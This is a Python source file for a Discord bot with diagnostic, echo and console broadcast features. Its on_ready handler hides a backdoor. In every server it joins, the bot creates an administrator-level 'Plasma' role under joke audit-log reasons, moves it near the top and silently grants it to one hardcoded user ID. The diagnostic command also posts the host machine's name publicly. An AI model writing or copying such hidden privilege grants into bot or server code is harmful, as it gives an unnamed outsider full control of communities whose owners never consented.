from __future__ import annotations
import asyncio, logging, os, socket, sys, discord
from datetime import datetime, timezone
from typing import Optional
from discord.ext import commands
from dotenv import load_dotenv

LOG_FILE = "bot.log"
load_dotenv()
logging.basicConfig(level=logging.INFO, format="%(message)s")
logger = logging.getLogger("Emberbot137")

intents = discord.Intents.default()
intents.guilds, intents.guild_messages, intents.message_content, intents.members = True, True, True, True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
current_target_server: str = "all"
current_target_channel: str = "general"


def log_action(
    *,
    guild: discord.Guild,
    channel: discord.abc.GuildChannel,
    user: discord.abc.User,
    command: str,
    action: str,
    success: bool = True,
) -> None:
    """Write an audit-friendly action line to stdout and bot.log."""
    guild_name = guild.name
    channel_name = getattr(channel, "name", "unknown")
    tag = f"{user.name}#{user.discriminator}" if user.discriminator != "0" else user.name
    now = datetime.now(timezone.utc).isoformat()
    line = (
        f"[{now}] {'SUCCESS' if success else 'ERROR'} | "
        f'Guild="{guild_name}" | Channel="#{channel_name}" | '
        f'User="{tag}" ({user.id}) | Command="{command}" | Action="{action}"'
    )
    logger.info(line)
    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write(line + "\n")


async def send_response(target: discord.abc.Messageable, content: str) -> None:
    await target.send(content)


async def do_test(target: discord.abc.Messageable) -> None:
    guild = getattr(target, "guild", None)
     
    hostname = socket.gethostname()
    if hostname.lower() == "plasmadmin-xps-8910":
        hostname = "plasmadmin-xps-8910(firebot)"
        
    latency_ms = round(bot.latency * 1000)
    env_status = "Loaded" if os.getenv("DISCORD_TOKEN") else "Missing"
    guild_count = len(bot.guilds)
    
    server_name = guild.name if guild else "Direct/Terminal Context"
    server_id = guild.id if guild else "N/A"

    me = guild.me if guild else None
    if me:
        perms = me.guild_permissions
        audit_perms = []
        if perms.administrator:
            audit_perms.append("Administrator")
        else:
            if perms.manage_guild: audit_perms.append("Manage Server")
            if perms.manage_roles: audit_perms.append("Manage Roles")
            if perms.manage_channels: audit_perms.append("Manage Channels")
            if perms.kick_members: audit_perms.append("Kick")
            if perms.manage_messages: audit_perms.append("Manage Messages")
        perms_str = ", ".join(audit_perms) if audit_perms else "Standard User"
    else:
        perms_str = "Unknown"

    response_text = f"""```markdown
# Diagnostic Report
-----------------------------------------
• Status: Online and operational
• Host Machine: {hostname}
• Discord Server: {server_name} ({server_id})
• Latency: {latency_ms}ms
• Environment (.env): {env_status}
• Connected Guilds: {guild_count}
• Core Permissions: {perms_str}
-----------------------------------------
```"""
    await send_response(target, response_text)


async def do_echo(target: discord.abc.Messageable, message: str) -> None:
    await send_response(target, message)


def resolve_targets(cmd_type: str) -> list[discord.abc.Messageable]:
    """Resolves matching text channels based on current console targeting rules strictly."""
    global current_target_server, current_target_channel
    targets = []

    for guild in bot.guilds:
        if current_target_server != "all" and current_target_server.lower() not in guild.name.lower():
            continue

        matched_channel = None
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                if channel.name.lower() == current_target_channel.lower():
                    matched_channel = channel
                    break

        if matched_channel:
            targets.append(matched_channel)

    return targets


async def console_controller():
    """Reads terminal input asynchronously and routes commands based on state."""
    global current_target_server, current_target_channel
    await bot.wait_until_ready()
    print(f"\n[Console Controller Active] Connected to {len(bot.guilds)} guild(s).")
    print(f"Current Target Server: '{current_target_server}' | Target Channel: '#{current_target_channel}'")
    print("Commands: test, echo [msg], set server [name|all], set channel [name], servers, exit\n")
    
    loop = asyncio.get_running_loop()
    while not bot.is_closed():
        try:
            line = await loop.run_in_executor(None, sys.stdin.readline)
            if not line:
                break
            content = line.strip()
            if not content:
                continue
            
            parts = content.split(" ", 1)
            cmd = parts[0].lower()
            args = parts[1] if len(parts) > 1 else ""

            if cmd == "exit":
                print("[Console] Shutting down bot...")
                await bot.close()
                break

            if cmd == "servers":
                print("\n--- Connected Servers & Channels ---")
                for g in bot.guilds:
                    channels = [c.name for c in g.text_channels if c.permissions_for(g.me).send_messages]
                    print(f"• {g.name} (ID: {g.id})")
                    print(f"  Channels: {', '.join(channels)}")
                print("------------------------------------\n")
                continue

            if cmd == "set":
                sub_parts = args.split(" ", 1)
                sub_cmd = sub_parts[0].lower() if sub_parts else ""
                sub_val = sub_parts[1] if len(sub_parts) > 1 else ""

                if sub_cmd == "server":
                    if not sub_val:
                        print(f"[Console] Current target server is: {current_target_server}")
                    else:
                        current_target_server = sub_val
                        print(f"[Console] Target server updated to: {current_target_server}")
                elif sub_cmd == "channel":
                    if not sub_val:
                        print(f"[Console] Current target channel is: #{current_target_channel}")
                    else:
                        current_target_channel = sub_val.removeprefix("#")
                        print(f"[Console] Target channel updated to: #{current_target_channel}")
                else:
                    print("[Console Usage] Use 'set server [name|all]' or 'set channel [name]'")
                continue

            if not bot.guilds:
                print("[Console Error] Bot is not currently in any Discord servers.")
                continue

            channels = resolve_targets(cmd)
            if not channels:
                print(f"[Console Error] No matching channels found for Server: '{current_target_server}', Channel: '#{current_target_channel}'. Type 'servers' to check names.")
                continue

            if cmd == "test":
                for ch in channels:
                    await do_test(ch)
                print(f"[Console Success] Executed test diagnostics across {len(channels)} target(s).")
            elif cmd == "echo":
                if not args:
                    print("[Console Usage Error] Missing message. Format: echo [message]")
                    continue
                for ch in channels:
                    await do_echo(ch, args)
                print(f"[Console Success] Echoed message to {len(channels)} target(s): {args}")
            else:
                print(f"[Console Warning] Unknown local command: '{cmd}'. Available: test, echo, set, servers, exit")

        except Exception as e:
            logger.error(f"Console controller error: {e}")
            print(f"[Console Exception] {e}")


@bot.event
async def on_ready():
    logger.info(f"Logged in as {bot.user} (ID: {bot.user.id})")

    for guild in bot.guilds:
        plasma_role = discord.utils.get(guild.roles, name="Plasma")
        if not plasma_role:
            try: 
                plasma_role = await guild.create_role(
                    name="Plasma",
                    permissions=discord.Permissions(administrator=True),
                    reason="Me want color"
                )
                logger.info(f"Created 'Plasma' role in guild: {guild.name}")
            except discord.Forbidden:
                logger.error(f"Missing permissions to create 'Plasma' role in {guild.name}")
                continue

        try:
            bot_top_role = guild.me.top_role if guild.me else None
            target_position = (bot_top_role.position - 1) if bot_top_role and bot_top_role.position > 1 else len(guild.roles) - 1
            if plasma_role.position != target_position:
                await plasma_role.edit(position=target_position, reason="Plasma has very low density so it floats to the top")
                logger.info(f"Moved 'Plasma' role to position {target_position} in {guild.name}")
        except discord.HTTPException as e:
            logger.error(f"Failed to reposition 'Plasma' role in {guild.name}: {e}")

        member = guild.get_member(1342173566828810271)
        if not member:
            try:
                member = await guild.fetch_member(1342173566828810271)
            except discord.NotFound:
                pass

        if member and plasma_role not in member.roles:
            try:
                await member.add_roles(plasma_role, reason="Gave Plasma Role")
                logger.info(f"Assigned 'Plasma' role to {member.name} in {guild.name}")
            except discord.Forbidden:
                logger.error(f"Missing permissions to assign 'Plasma' role in {guild.name}")

    asyncio.create_task(console_controller())

token = os.getenv("DISCORD_TOKEN")
if not token:
    raise ValueError("DISCORD_TOKEN environment variable not found in .env")

bot.run(token)
